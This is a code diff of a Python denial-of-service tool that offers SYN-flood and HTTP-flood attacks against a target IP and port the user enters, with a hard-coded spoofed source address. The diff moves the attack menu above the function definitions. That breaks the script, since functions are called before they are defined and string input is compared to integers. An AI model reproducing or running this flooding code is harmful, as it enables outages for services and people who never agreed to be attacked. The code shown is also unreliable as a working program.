@@ -17,6 +17,21 @@ print("Coded By: ParzivalHack")
 print("Github: https://github.com/ParzivalHack")
 fake_ip = '44.197.175.168'
 attack_num = 0
+print("      [Menu]      ")
+print("1) SYN Flood")
+print("2) HTTP Flood")
+option = raw_input("Choose an option: ")
+if option == 1:
+	os.system("clear")
+	dstIP = str(raw_input("Target IP: "))
+	dstPort = int(input("Target Port: "))
+	counter = input("Packets to send: ")
+	main()
+elif option == 2:
+	os.system("clear")
+	target = str(input("Insert Target: "))
+	port = int(input("Insert Port: "))
+	attack()
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -71,18 +86,3 @@ def SYN_Flood(dstIP,dstPort,counter):
 
 def main():
 	SYN_Flood(dstIP,dstPort,int(counter))
-print("      [Menu]      ")
-print("1) SYN Flood")
-print("2) HTTP Flood")
-option = raw_input("Choose an option: ")
-if option == 1:
-	os.system("clear")
-	dstIP = str(raw_input("Target IP: "))
-	dstPort = int(input("Target Port: "))
-	counter = input("Packets to send: ")
-	main()
-elif option == 2:
-	os.system("clear")
-	target = str(input("Insert Target: "))
-	port = int(input("Insert Port: "))
-	attack()
